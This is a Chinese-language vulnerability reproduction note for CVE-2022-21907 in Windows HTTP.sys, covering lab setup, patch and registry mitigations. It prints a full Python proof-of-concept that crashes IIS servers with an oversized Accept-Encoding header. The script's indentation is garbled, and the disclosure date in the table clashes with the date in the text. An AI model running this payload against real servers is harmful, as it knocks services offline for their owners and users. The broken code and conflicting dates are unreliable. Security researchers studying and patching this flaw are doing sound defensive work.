
# 0X00 漏洞信息
2022年1月14日，监测到一则微软官方公开并修复了Microsoft Windows HTTP协议栈远程代码执行（CVE-2022-21907）漏洞的信息。该漏洞是由于 HTTP 协议栈(HTTP.sys)中的 HTTP Trailer Support 功能中存在边界错误导致缓冲区溢出。Windows HTTP 协议栈（HTTP.sys）是Windows操作系统中处理HTTP请求的内核驱动程序，常见于Web浏览器与 Web 服务器之间的通信，以及Internet Information Services (IIS)中。<br />未授权的远程攻击者通过向 Web 服务器发送一个特制的 HTTP 请求，触发缓冲区溢出，从而在目标系统上执行任意代码或造成服务器拒绝服务。<br />未经身份验证的攻击者通过向Web服务器发送特制的HTTP数据包，从而在目标系统上执行任意代码。<br />该漏洞被微软提示为“可蠕虫化”，无需用户交互便可通过网络进行自我传播，目前已发现可造成目标主机蓝屏崩溃的漏洞利用出现，请相关用户尽快采取措施进行防护。


# 0X01 漏洞概述
| 漏洞名称 | HTTP协议栈远程代码执行漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2022-21907 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 20211214 |
| 分数 | 9.8 |
| CVSS | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2022-21907#vulnCurrentDescriptionTitle](https://nvd.nist.gov/vuln/detail/CVE-2022-21907#vulnCurrentDescriptionTitle) |


# 0X02 影响范围
**受影响版本：**
```
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 21H2 for ARM64-based Systems
Windows 10 Version 21H2 for 32-bit Systems
Windows 11 for ARM64-based Systems
Windows 11 for x64-based Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server 2022 (Server Core installation)
Windows Server 2022
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 21H2 for x64-based Systems
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
```

**不受影响版本：**
```
Windows 10 version 1909
Windows Server 2019（默认配置不受影响）
Windows 10 version 1809（默认配置不受影响）
```


# 0X03 环境搭建
1、搭建存在漏洞的Win10系统
![image.png](_img/assets/1659429240424-975bfe71-6e46-4afe-8b23-55b4e00d6047.png)

2、启用IIS服务
![image.png](_img/assets/1659429280269-9c97d32e-2b2f-4b65-bf4d-8e51218f48ee.png)

3、启动网站
![image.png](_img/assets/1659429321696-6b28239c-b610-4880-8273-7fa00e05bb0e.png)

4、访问网站，成功访问则环境搭建成功。


# 0X04 代码审计



# 0X05 漏洞复现
运行POC脚本后，系统蓝屏。
```python
$ ./CVE-2022-21907_http.sys_crash.py -h
usage: CVE-2022-21907_http.sys_crash.py [-h] -t TARGET [-v]

Description message

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target IIS Server.
  -v, --verbose         Verbose mode. (default: False)
```

```python
./CVE-2022-21907_http.sys_crash.py -t 192.168.1.18
```
![image-20220120100402148.png](_img/assets/1659429724219-1bf3a822-870d-4435-9f39-93b121734f72.png)

分析Dump文件
![image.png](_img/assets/1659429514403-5956a098-431d-44fb-9166-378018807314.png)

调用栈情况
![image.png](_img/assets/1659429552334-859668b8-4509-4360-ab92-d7328f09e97c.png)


# 0X05 POC
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : CVE-2022-21907_http.sys_crash.py
# Author             : Podalirius (@podalirius_)
# Date created       : 13 Jan 2022

import argparse
import datetime
import requests
import time
import threading


def parseArgs():
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-t", "--target", default=None, required=True, help='Target IIS Server.')
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    return parser.parse_args()


def monitor_thread(target, dtime=5):
    print('[>] Started monitoring of target server for the next %d seconds.' % dtime)
    for k in range(dtime):
        try:
            r = requests.get(target, timeout=1)
        except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e:
            print("   [%s] \x1b[1;91mTarget is down!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        else:
            print("   [%s] \x1b[1;92mTarget is reachable!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            time.sleep(1)
            
            
            if __name__ == '__main__':
                options = parseArgs()
                
                if not options.target.startswith('http://') and not options.target.startswith('https://'):
                    target = "http://" + options.target
                else:
                    target = options.target
                    
                    payload = 'AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,'
                    
                    # Starting monitoring thread
                    t = threading.Thread(target=monitor_thread, args=(target,))
                    t.start()
                    time.sleep(2)
                    
                    # Sending payload
                    print("   [+] Sending payload ...")
                    try:
                        r = requests.get(target, headers={"Accept-Encoding": payload}, timeout=15)
                    except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e:
                        t.join()
                        print("[%s] \x1b[1;91mTarget successfully crashed!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                        
                        # Cleanup
    t.join()
```


# 0X06 解决方案
**补丁更新：**<br />Windows系统默认启用Microsoft Update，当检测到可用更新时，将会自动下载更新并在下一次启动时安装。还可通过以下步骤快速安装更新：

1. 点击“开始菜单”或按Windows快捷键，点击进入“设置”
2. 选择“更新和安全”，进入“Windows更新”（Windows8、Windows 8.1、WindowsServer 2012以及Windows Server2012 R2可通过控制面板进入“Windows更新”，步骤为“控制面板”->“系统和安全”->“Windows更新”）
3. 选择“检查更新”，等待系统将自动检查并下载可用更新
4. 重启计算机，安装更新

目前微软官方已针对受支持的产品版本发布了修复以上漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，官方下载链接：[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21907](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21907) <br />注：由于网络问题、计算机环境问题等原因，Windows Update的补丁更新可能出现失败。用户在安装补丁后，应及时检查补丁是否成功更新。<br />针对未成功安装的更新，可点击更新名称跳转到微软官方下载页面，建议用户点击该页面上的链接，转到“Microsoft更新目录”网站下载独立程序包并安装。


**临时防护**<br />若使用Windows Server 2019和Windows 10 version 1809版本的用户暂时无法安装补丁，可使用下列措施进行临时缓解：

在DWORD注册表中删除“EnableTrailerSupport”可防护此漏洞的攻击，“EnableTrailerSupport”的路径为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\HTTP\Parameters

注：当用户通过EnableTrailerSupport注册表值启用了HTTP Trailer Support时，以上版本才受该漏洞影响，默认配置时不受该漏洞影响

